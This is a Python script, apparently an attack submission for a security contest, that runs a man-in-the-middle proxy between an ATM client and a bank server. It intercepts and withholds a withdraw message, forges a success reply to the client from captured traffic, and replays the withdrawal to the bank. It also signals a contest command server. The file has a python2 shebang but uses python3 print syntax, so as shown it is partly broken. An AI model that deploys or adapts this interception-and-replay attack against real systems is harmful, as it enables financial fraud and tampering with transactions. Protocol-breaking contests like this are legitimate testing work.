#!/usr/bin/env python2
import argparse
import signal
import socket
import sys
import threading
import time
from contextlib import contextmanager

import requests

running = True
localSocket = None

CLIENT2SERVER = 1
SERVER2CLIENT = 2

messageCountClientServer = 0
messageCountServerClient = 0

withdrawSuccess = ""
withdrawSuccessAck = ""
withdraw = ""
withdrawEOF = ""


def pre_mitm(buff, direction, client, server):
    message = str(buff)

    if message[-1] == "." and len(message) > 1:
        sliced = message[:len(message) - 1]
        mitm(sliced, direction, client, server)
        slice2 = "."
        mitm(slice2, direction, client, server)

    else:
        mitm(buff, direction, client, server)


def mitm(buff, direction, client, server):
    global messageCountClientServer, messageCountServerClient
    global withdrawSuccess, withdrawSuccessEOF, withdrawSuccessAck
    global withdraw, withdrawEOF

    out = {"message": buff, "sendTo": server}
    if direction == CLIENT2SERVER:
        messageCountClientServer += 1
        if messageCountClientServer == 9:
            print('Failing withdraw: ' + str(out["message"]), file=sys.stderr)
            withdraw = out["message"]
            out.clear()
        if messageCountClientServer == 10:
            print('Failing withdraw EOF: ' + str(out["message"]), file=sys.stderr)
            withdrawEOF = out["message"]
            print('Send "success" to client: ' + str(withdrawSuccess), file=sys.stderr)
            client.send(withdrawSuccess)
            print('Send "success EOF" to client: ' + str(withdrawSuccessEOF), file=sys.stderr)
            client.send(withdrawSuccessEOF)
            out.clear()
        if messageCountClientServer == 11:
            print('Withdraw ACK: ' + str(out["message"]))
            withdrawSuccessAck = out["message"]
            out.clear()
        
        if messageCountClientServer == 12:
             print('Withdraw ACK_EOF: ' + str(out["message"]), file=sys.stderr)
             withdrawSuccessAck = withdrawSuccessAck + out["message"]
             print('Withdraw concatenated: ' + str(withdrawSuccessAck), file=sys.stderr)
             out.clear()

    elif direction == SERVER2CLIENT:
        messageCountServerClient += 1
        print('s2c - ' + str(messageCountServerClient) + '  :' + str(out["message"]), file=sys.stderr)
        if messageCountServerClient == 3:
            print('Withdraw success: ' + str(out["message"]), file=sys.stderr)
            withdrawSuccess = out["message"]
        if messageCountServerClient == 4:
            print('Withdraw EOF: ' + str(out["message"]), file=sys.stderr)
            withdrawSuccessEOF = out["message"]

    if out and out["sendTo"] is not None:
        if direction == CLIENT2SERVER:
            if out["sendTo"] is client:
                print('Send from atm to atm: ' + str(out["message"]), file=sys.stderr)
            else:
                print('Send from atm to bank: ' + str(out["message"]), file=sys.stderr)
        elif direction == SERVER2CLIENT:
            if out["sendTo"] is client:
                print('Send from bank to bank: ' + str(out["message"]), file=sys.stderr)
            else:
                print('Send from bank to atm: ' + str(out["message"]), file=sys.stderr)

        out["sendTo"].send(out["message"])

    return


@contextmanager
def ignored(*exceptions):
    try:
        yield
    except exceptions:
        pass


def killpn(a, b, n):
    if n != CLIENT2SERVER:
        killp(a, b)


def killp(a, b):
    global messageCountClientServer, messageCountServerClient
    with ignored(Exception):
        a.shutdown(socket.SHUT_RDWR)
        a.close()
        b.shutdown(socket.SHUT_RDWR)
        b.close()
    return


def worker(client, server, n):
    while running:
        b = ""
        with ignored(Exception):
            b = client.recv(1024)
        if len(b) == 0:
            killpn(client, server, n)
            return
        try:
            pre_mitm(b, n, client, server)
        except:
            print(str.format("Unexpected error: {0}", sys.exc_info()[0]), file=sys.stderr)
            killpn(client, server, n)
            return
    killp(client, server)
    return


def send_get_balance_to_command_server(command_server_host, command_server_port):
    print(str.format("Send -g command to {0}:{1}", command_server_host, str(command_server_port)), file=sys.stderr)
    try:
        requests.post("http://" + command_server_host + ":" + str(command_server_port),
                      data={"REQUEST": '{"type": "input",'
                                       '"input":{' +
                                       '"input": ["-p","%PORT%","-i","%IP%","-a","ted","-g"]}' +
                                       '}'})
    except:
        print("Unable to reach command server.", file=sys.stderr)
        return


def send_done_to_command_server(command_server_host, command_server_port):
    time.sleep(30)
    print(str.format("Send done to {0}:{1}", command_server_host, str(command_server_port)), file=sys.stderr)
    try:
        print("http://" + command_server_host + ":" + str(command_server_port), file=sys.stderr)
        response = requests.post("http://" + command_server_host + ":" + str(command_server_port),
                      data={"REQUEST": '{"type": "done"}'})
        print("Response from command is: " +str(response), file=sys.stderr)
    except:
        print("Unable to reach command server.", file=sys.stderr)
        return


def replay_attack_and_finalize(bank_host, bank_port, command_host, command_port):
    global withdraw, withdrawEOF, withdrawSuccessAck

    bank = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    bank.connect((bank_host, bank_port))
    print('Sent fake withdraw to bank: ' + str(withdraw), file=sys.stderr)
    bank.send(withdraw)
    print('Sent fake withdraw EOF to bank: ' + str(withdrawEOF), file=sys.stderr)
    bank.send(withdrawEOF)

    try:
        b = bank.recv(1024)
        print('Success of spoofed withdraw: ' + str(b), file=sys.stderr)
        b = bank.recv(1024)
        print('Success of spoofed withdraw EOF: ' + str(b), file=sys.stderr)

        bank.shutdown(socket.SHUT_RDWR)
        bank.close()

        bank = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        bank.connect((bank_host, bank_port))
        bank.sendall(withdrawSuccessAck)
    except:
        print(str.format("Unexpected error: {0}", sys.exc_info()[0]), file=sys.stderr)
        bank.shutdown(socket.SHUT_RDWR)
        bank.close()
        return
    bank.shutdown(socket.SHUT_RDWR)
    bank.close()

    send_get_balance_to_command_server(command_host, command_port)
    return


def signalhandler(sn, sf):
    global running, localSocket
    running = False
    localSocket.shutdown(socket.SHUT_RDWR)
    localSocket.close()


def doProxyMain(port, remotehost, remoteport, command_server_host, command_server_port):
    global messageCountClientServer, messageCountServerClient
    global localSocket

    signal.signal(signal.SIGTERM, signalhandler)

    message_counter = 0
    workers = []

    try:
        localSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        localSocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        localSocket.bind(("0.0.0.0", port))
        localSocket.listen(1)

        while message_counter < 4:
            message_counter += 1

            k, a = localSocket.accept()
            v = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            v.connect((remotehost, remoteport))
            print(str.format("Starting threads for message {2}: s2c: {0} | c2s {1}",
                             messageCountServerClient, messageCountClientServer, message_counter), file=sys.stderr)
            t1 = threading.Thread(target=worker, args=(k, v, CLIENT2SERVER))
            t2 = threading.Thread(target=worker, args=(v, k, SERVER2CLIENT))
            t2.start()
            t1.start()
            workers.append((t1, t2, k, v))

        while message_counter < 6:
            message_counter += 1

            k, a = localSocket.accept()
            t1 = threading.Thread(target=worker, args=(k, None, CLIENT2SERVER))
            t1.start()
            workers.append((t1, None, k, None))

        while message_counter < 8:
            message_counter += 1

            k, a = localSocket.accept()
            v = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            v.connect((remotehost, remoteport))
            print(str.format("Starting threads for message {2}: s2c: {0} | c2s {1}",
                             messageCountServerClient, messageCountClientServer, message_counter), file=sys.stderr)
            t1 = threading.Thread(target=worker, args=(k, v, CLIENT2SERVER))
            t2 = threading.Thread(target=worker, args=(v, k, SERVER2CLIENT))
            t2.start()
            t1.start()
            workers.append((t1, t2, k, v))

       
        threading.Thread(target=replay_attack_and_finalize,
                         args=(remotehost, remoteport, command_server_host, command_server_port)).start()

        threading.Thread(target=send_done_to_command_server, args=(command_server_host, command_server_port)).start()

        while running is True:
            k, a = localSocket.accept()
            v = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            v.connect((remotehost, remoteport))
            print(str.format("Starting threads for message {2}: s2c: {0} | c2s {1}",
                             messageCountServerClient, messageCountClientServer, message_counter), file=sys.stderr)
            t1 = threading.Thread(target=worker, args=(k, v, CLIENT2SERVER))
            t2 = threading.Thread(target=worker, args=(v, k, SERVER2CLIENT))
            t2.start()
            t1.start()
            workers.append((t1, t2, k, v))

    except KeyboardInterrupt:
        signalhandler(None, None)
    except:
        print(str.format("Unexpected error: {0}", sys.exc_info()[0]), file=sys.stderr)
        pass

    for t1, t2, k, v in workers:
        killp(k, v)
        if t1 is not None:
            t1.join()
        if t2 is not None:
            t2.join()
    return


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Proxy')
    parser.add_argument('-p', type=int, default=4000, help="listen port")
    parser.add_argument('-s', type=str, default="127.0.0.1", help="server ip address")
    parser.add_argument('-q', type=int, default=3000, help="server port")
    parser.add_argument('-c', type=str, default="127.0.0.1", help="command server")
    parser.add_argument('-d', type=int, default=5000, help="command port")
    args = parser.parse_args()
    print('started\n')
    sys.stdout.flush()
    doProxyMain(args.p, args.s, args.q, args.c, args.d)
